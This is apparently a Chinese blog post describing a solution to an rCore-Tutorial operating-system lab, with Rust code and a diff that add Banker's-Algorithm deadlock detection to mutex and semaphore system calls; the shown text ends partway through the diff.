    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为死锁和信号量机制实现死锁检测功能，并提供系统调用 <code>enable_deadlock_detect</code>，用以开启和关闭死锁检测功能。在开启死锁检测功能的情况下，用户使用 <code>mutex_lock</code> 或 <code>semaphore_down</code> 尝试获取互斥资源时，如果发现系统处于不安全状态（可能发生死锁）时拒绝对应的资源获取请求。</p><p>实验手册中介绍的死锁检测算法为银行家算法（Banker\’s Algorithm），由 Dijkstra 提出，算法的流程可以参照<a href="https://learningos.cn/rCore-Tutorial-Guide-2024A/chapter8/5exercise.html">手册</a>，这里不再详细介绍，代码实现如下：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Banker's Algoritm for dead lock check</span><span class="token keyword">fn</span> <span class="token function-definition function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">,</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// n: thread count  m: resources count</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>allocation<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allocation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> work <span class="token operator">=</span> available<span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> finish <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token boolean">false</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>n <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> finish<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> flag <span class="token punctuation">&#123;</span>                idx <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// has found a thread meet the requirement</span>        <span class="token keyword">if</span> idx <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>m <span class="token punctuation">&#123;</span>                work<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> allocation<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            finish<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    finish<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token operator">&amp;</span>x<span class="token closure-punctuation punctuation">|</span></span> x<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>根据现有的 Available, Allocation 和 Need 来进行死锁的检测并不复杂，关键在于如何将这一算法融入现有的线程互斥机制中，更具体地说，如何维护内核中与此相关的状态，以便在进行死锁检测前能够正确构造出 Available, Allocation 和 Need 数据结构。</p><p>不妨先考虑更简单的情况：要想为锁机制实现死锁检测，如何维护其状态？首先需要保存当前线程需要哪把锁，需要明确的一点是：每个线程“需要”的资源只有 1 个，因为每个线程只有当所需的资源被满足后才会继续执行以获取更多资源，否则就会被阻塞。因此可以为线程控制块添加一个 <code>usize</code> 变量 <code>mutex_need</code> 来存储该线程当前需要锁资源的 id。除此之外，还需要一个向量 <code>mutex_allocation</code> 来存储线程已获取未释放锁资源的 id。</p><p>当使用 <code>sys_mutex_lock(mutex_id)</code> 尝试获取 <code>mutex_id</code> 的锁时，在使用 <code>mutex.lock()</code> 实际获取锁之前，将当前线程的 <code>mutex_need</code> 设置为 <code>mutex_id</code>，当线程成功获取锁资源后，将 <code>mutex_id</code> 放入 <code>mutex_allocation</code> 向量中，并将 <code>mutex_need</code> 设置为空（我这里采用的是将 <code>usize::MAX</code> 看作空，也可以使用 <code>Option</code> 类型，相对来说更优雅）。</p><p>当使用 <code>sys_mutex_unlock(mutex_id)</code> 尝试释放 <code>mutex_id</code> 的锁时，在使用 <code>mutex.unlock()</code> 实际释放锁之前，查找当前线程的 <code>mutex_allocation</code> 向量，移除值为 <code>mutex_id</code> 的元素。</p><p>实现上述逻辑后，就能在进行死锁检测前，根据所维护的信息将 Available, Allocation 和 Need 构造出来，作为银行家算法的参数，检测当前系统是否处于不安全状态，构造代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> process_inner<span class="token punctuation">.</span>dlcheck_option <span class="token punctuation">&#123;</span>    <span class="token comment">// initialize data structure for Banker's Algorithm:</span>    <span class="token comment">// Avavilable Vector, Allocation Matrix, Need Matrix</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> m <span class="token operator">=</span> process_inner<span class="token punctuation">.</span>mutex_list<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> available<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> allocation<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> need<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">>></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> task_opt<span class="token punctuation">)</span> <span class="token keyword">in</span> process_inner<span class="token punctuation">.</span>tasks<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">match</span> task_opt <span class="token punctuation">&#123;</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> task_inner <span class="token operator">=</span> task<span class="token punctuation">.</span><span class="token function">inner_exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token operator">&amp;</span>task_inner<span class="token punctuation">.</span>mutex_allocation <span class="token punctuation">&#123;</span>                    allocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    available<span class="token punctuation">[</span><span class="token operator">*</span>mid<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">let</span> nid <span class="token operator">=</span> task_inner<span class="token punctuation">.</span>mutex_need<span class="token punctuation">;</span>                <span class="token keyword">if</span> nid <span class="token operator">!=</span> <span class="token keyword">usize</span><span class="token punctuation">::</span><span class="token constant">MAX</span> <span class="token punctuation">&#123;</span>                    need<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>nid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">drop</span><span class="token punctuation">(</span>task_inner<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token operator">!</span><span class="token function">deadlock_check</span><span class="token punctuation">(</span>available<span class="token punctuation">,</span> allocation<span class="token punctuation">,</span> need<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">0xDEAD</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>信号量机制的实现大体相似，不过需要注意一些细节。</p><p>因为信号量的数量不再是二值的（有或没有），因此线程的资源分配向量中还需要包含每个信号量的数量，向量的元素可以选择用 <code>&lt;sem_id, cnt&gt;</code> 这样的二元组来表示，也可以用 <code>cnt</code> 个 <code>sem_id</code> 元素来表示这么一个二元组，我在这里采用的是前者。</p><p>另外，信号量还可以为负数，负数信号量的绝对值表示当前资源被提前“透支”的数量，而在银行家算法中，资源数量 <code>Available[i][j]</code> 不能为负数，此时应该将其看作 0。</p><pre class="language-rust" data-language="rust"><code class="language-rust">available<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>sem_inner<span class="token punctuation">.</span>count<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后，当线程 A 提前“透支”信号量进入休眠状态，线程 B 释放资源后调用 <code>wakeup_task(task)</code> 尝试唤醒线程 A 前，设置线程 A 的 <code>sem_allocation</code> 向量。否则可能由于线程调度的不确定性，导致线程 B 在被 <code>sem_allocation</code> 未被设置的情况下被调度，从而后续的死锁检测出现错误，让系统意外地进入死锁的状态。</p><blockquote><p>有关这样做法的合理性原因，我也不是很确定，因为我在未遵守上述顺序的情况下，执行 <code>ch8_deadlock_sem2</code> 进入死锁的几率非常大（大约 90%），而这应该不全是线程调度的随机性所导致。</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/sync/semaphore.rs b/os/src/sync/semaphore.rsindex 509b504..5743172 100644<span class="token coord">--- a/os/src/sync/semaphore.rs</span><span class="token coord">+++ b/os/src/sync/semaphore.rs</span>@@ -36,6 +36,15 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        inner.count += 1;</span><span class="token prefix unchanged"> </span><span class="token line">        if inner.count &lt;= 0 &#123;</span><span class="token prefix unchanged"> </span><span class="token line">            if let Some(task) = inner.wait_queue.pop_front() &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                    None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">                drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                wakeup_task(task);</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span>@@ -50,6 +59,17 @@ impl Semaphore &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.wait_queue.push_back(current_task().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">            drop(inner);</span><span class="token prefix unchanged"> </span><span class="token line">            block_current_and_run_next();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">            let sem_id = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">            match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(index) => task_inner.sem_allocation[index].1 += 1,</span><span class="token prefix inserted">+</span><span class="token line">                None => task_inner.sem_allocation.push((sem_id, 1)),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            task_inner.sem_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">            drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">            drop(task);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 31fa22a..82c0991 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,11 +1,13 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_ref, translated_refmut, translated_str&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">        current_process, current_task, current_user_token, exit_current_and_run_next, pid2process,</span><span class="token prefix unchanged"> </span><span class="token line">        suspend_current_and_run_next, SignalFlags, TaskStatus,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::&#123;string::String, sync::Arc, vec::Vec&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -164,10 +166,24 @@ pub fn sys_kill(pid: usize, signal: u32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().process.upgrade().unwrap().getpid()</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// task_info syscall</span></span>diff --git a/os/src/syscall/sync.rs b/os/src/syscall/sync.rsindex 290ee6f..6d25e65 100644<span class="token coord">--- a/os/src/syscall/sync.rs</span><span class="token coord">+++ b/os/src/syscall/sync.rs</span><span class="token coord">@@ -1,7 +1,11 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::cmp::max;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::&#123;Condvar, Mutex, MutexBlocking, MutexSpin, Semaphore&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;block_current_and_run_next, current_process, current_task&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::timer::&#123;add_timer, get_time_ms&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec;</span><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// sleep syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sleep(ms: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span>@@ -71,9 +75,75 @@ pub fn sys_mutex_lock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // set mutex_need to current</span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = mutex_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.mutex_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available: Vec&lt;usize> = vec![1; m];</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for mid in &amp;task_inner.mutex_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*mid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                        available[*mid] -= 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.mutex_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span><span class="token prefix unchanged"> </span><span class="token line">    mutex.lock();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_allocation.push(mutex_id);</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.mutex_need = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// mutex unlock syscall</span></span>@@ -89,11 +159,22 @@ pub fn sys_mutex_unlock(mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.mutex_allocation.iter().position(|&amp;x| x == mutex_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.mutex_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mutex.unlock();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -142,10 +223,21 @@ pub fn sys_semaphore_up(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            .unwrap()</span><span class="token prefix unchanged"> </span><span class="token line">            .tid</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(index) = task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation[index].1 -= 1;</span><span class="token prefix inserted">+</span><span class="token line">        if task_inner.sem_allocation[index].1 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        task_inner.sem_allocation.swap_remove(index);</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix 